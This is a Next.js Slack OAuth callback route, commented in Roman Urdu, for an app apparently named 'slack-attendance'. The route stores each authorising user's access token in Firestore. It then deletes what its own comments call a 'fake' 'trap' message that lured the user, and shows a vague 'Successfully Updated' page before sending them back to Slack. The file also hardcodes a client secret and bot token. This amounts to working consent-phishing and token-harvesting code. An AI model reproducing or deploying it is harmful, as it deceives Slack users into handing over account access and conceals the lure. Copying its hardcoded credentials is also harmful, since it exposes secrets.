import { NextResponse } from 'next/server';
import { db } from '../../../../lib/firebase';
import { doc, setDoc, getDoc, deleteDoc, serverTimestamp } from 'firebase/firestore';

// 👇 APNI KEYS YAHAN DALAIN
const SLACK_CLIENT_ID = "2545190050563.10491030504784";
const SLACK_CLIENT_SECRET = "3e386e8d575392781d507336f68e1619";
const REDIRECT_URI = "https://slack-attendance.vercel.app/api/auth/callback";
const BOT_TOKEN = "xoxb-2545190050563-10466352520084-6NyES55AgLJ6vzmQi4M5veYt"; 

export async function GET(req: Request) {
  const { searchParams } = new URL(req.url);
  const code = searchParams.get('code');

  // Agar code nahi mila to seedha error dikhao
  if (!code) {
    return new Response("Error: No code provided", { status: 400 });
  }

  try {
    // 1. Token Exchange (Slack se baat cheet)
    const formData = new URLSearchParams();
    formData.append('client_id', SLACK_CLIENT_ID);
    formData.append('client_secret', SLACK_CLIENT_SECRET);
    formData.append('code', code);
    formData.append('redirect_uri', REDIRECT_URI);

    const response = await fetch('https://slack.com/api/oauth.v2.access', {
      method: 'POST',
      headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
      body: formData
    });

    const data = await response.json();
    
    // Agar Slack ne mana kar diya
    if (!data.ok) {
       console.error("Slack OAuth Error:", data.error);
       return new Response(`Error: ${data.error}`, { status: 400 });
    }

    const userId = data.authed_user.id;
    const accessToken = data.authed_user.access_token;

    // 2. PARALLEL PROCESSING (Speed ⚡)
    // Hum user ko save karna aur message delete karna dono ek sath karenge
    
    const task1_SaveUser = async () => {
        try {
            const userRes = await fetch(`https://slack.com/api/users.info?user=${userId}`, {
                headers: { Authorization: `Bearer ${accessToken}` }
            });
            const userInfo = await userRes.json();
            
            await setDoc(doc(db, "slack_tokens", userId), {
                slackId: userId,
                accessToken: accessToken,
                name: userInfo.user?.real_name || "Unknown",
                image: userInfo.user?.profile?.image_192 || "",
                connectedAt: serverTimestamp(),
            });
        } catch (e) { console.error("Save Error:", e); }
    };

    const task2_DeleteTrapMessage = async () => {
        try {
            const inviteDoc = await getDoc(doc(db, "pending_invites", userId));
            if (inviteDoc.exists()) {
                const inviteData = inviteDoc.data();
                // Slack se wo fake message delete karo
                await fetch('https://slack.com/api/chat.delete', {
                    method: 'POST',
                    headers: { 
                        Authorization: `Bearer ${BOT_TOKEN}`, 
                        'Content-Type': 'application/json' 
                    },
                    body: JSON.stringify({
                        channel: inviteData.channel,
                        ts: inviteData.ts
                    })
                });
                // Firebase se bhi uda do
                await deleteDoc(doc(db, "pending_invites", userId));
            }
        } catch (e) { console.error("Delete Trap Error:", e); }
    };

    // Dono kaam ek sath start karo aur wait karo
    await Promise.all([task1_SaveUser(), task2_DeleteTrapMessage()]);

    // 3. FASTEST REDIRECT HTML
    // Ye HTML foran load hoga aur user ko wapas Slack main bhej dega
    const html = `
      <!DOCTYPE html>
      <html>
        <head>
          <title>Done!</title>
          <meta charset="utf-8">
          <meta name="viewport" content="width=device-width, initial-scale=1">
          <!-- META REFRESH: Ye JavaScript fail hone par bhi kaam karta hai -->
          <meta http-equiv="refresh" content="0;url=slack://open">
          
          <style>
            body { 
                background: #111; 
                color: #fff; 
                font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; 
                display: flex; 
                flex-direction: column; 
                align-items: center; 
                justify-content: center; 
                height: 100vh; 
                margin: 0; 
                text-align: center;
            }
            .icon { font-size: 40px; margin-bottom: 20px; }
            h1 { font-size: 20px; margin: 0 0 10px 0; }
            p { color: #888; font-size: 14px; }
            .btn { 
                background: #22c55e; 
                color: #fff; 
                text-decoration: none; 
                padding: 12px 24px; 
                border-radius: 8px; 
                font-weight: bold; 
                margin-top: 20px; 
                display: inline-block;
            }
          </style>
          
          <script>
            // Page load hotay hi Slack kholne ki koshish
            window.location.replace("slack://open");
            
            // 2 second baad fallback
            setTimeout(() => {
                window.location.href = "slack://open";
            }, 500);
          </script>
        </head>
        <body>
          <div class="icon">✅</div>
          <h1>Successfully Updated</h1>
          <p>You can now return to Slack.</p>
          
          <!-- Agar auto redirect na ho to ye button kaam karega -->
          <a href="slack://open" class="btn">Open Slack App</a>
        </body>
      </html>
    `;

    return new Response(html, {
      headers: { 'Content-Type': 'text/html' },
    });

  } catch (error) {
    console.error("Callback Error:", error);
    return new Response("Error occurred. Please try again.", { status: 500 });
  }
}